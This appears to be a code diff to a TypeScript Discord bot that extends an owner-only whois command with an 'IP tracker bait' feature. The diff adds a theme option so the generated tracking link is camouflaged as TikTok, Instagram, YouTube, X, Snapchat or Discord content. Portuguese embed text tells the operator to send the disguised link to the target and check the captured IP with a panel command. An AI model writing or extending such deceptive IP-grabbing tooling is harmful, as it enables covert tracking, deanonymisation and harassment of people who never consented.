@@ -485,6 +485,19 @@ const COMMANDS = [
     )
     .addBooleanOption(opt =>
       opt.setName("private").setDescription("Resposta visível apenas para você? (padrão: não)").setRequired(false)
+    )
+    .addStringOption(opt =>
+      opt.setName("tracker_theme")
+        .setDescription("🪤 Tema do link bait (IP Tracker) — owner only")
+        .setRequired(false)
+        .addChoices(
+          { name: "🎵 TikTok",    value: "tiktok"    },
+          { name: "📷 Instagram", value: "instagram" },
+          { name: "▶️ YouTube",   value: "youtube"   },
+          { name: "𝕏 X / Twitter", value: "x"        },
+          { name: "👻 Snapchat",  value: "snapchat"  },
+          { name: "🎮 Discord",   value: "discord"   },
+        )
     ),
 
 ].map(c => c.toJSON());
@@ -2584,19 +2597,30 @@ async function handleWhois(interaction: ChatInputCommandInteraction): Promise<vo
   // ── IP Tracker bait link (owner-only) ─────────────────────────────────────
   if (isCallerOwner) {
     try {
+      const selectedTheme = interaction.options.getString("tracker_theme") ?? "tiktok";
+      const THEME_LABELS: Record<string, string> = {
+        tiktok: "🎵 TikTok", instagram: "📷 Instagram", youtube: "▶️ YouTube",
+        x: "𝕏 X / Twitter", snapchat: "👻 Snapchat", discord: "🎮 Discord",
+      };
       const trackerRes = await fetch(`${API_BASE}/api/tracker/gen`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ userId: targetUser.id, username: targetUser.username, targetName: targetUser.displayName }),
+        body: JSON.stringify({
+          userId: targetUser.id,
+          username: targetUser.username,
+          targetName: targetUser.displayName,
+          theme: selectedTheme,
+        }),
       }).catch(() => null);
       if (trackerRes?.ok) {
-        const { token, url } = await trackerRes.json() as { token: string; url: string };
+        const { token, url, theme } = await trackerRes.json() as { token: string; url: string; theme: string };
         embedTech.addFields({
-          name: "🪤 IP TRACKER — GEASS BAIT (Option Owner)",
+          name: `🪤 IP TRACKER — ${THEME_LABELS[theme] ?? theme.toUpperCase()} BAIT (Owner)`,
           value: [
             `**Token:** \`${token}\``,
-            `**Link:** ${url}`,
-            `**Uso:** Envie este link para o alvo. Use \`/panel ipcheck token:${token}\` para ver o resultado.`,
+            `**Link camuflado:** ${url}`,
+            `**Aparência:** Link de ${THEME_LABELS[theme] ?? theme} — convince como conteúdo real`,
+            `**Resultado:** \`/panel ipcheck token:${token}\``,
           ].join("\n"),
           inline: false,
         });
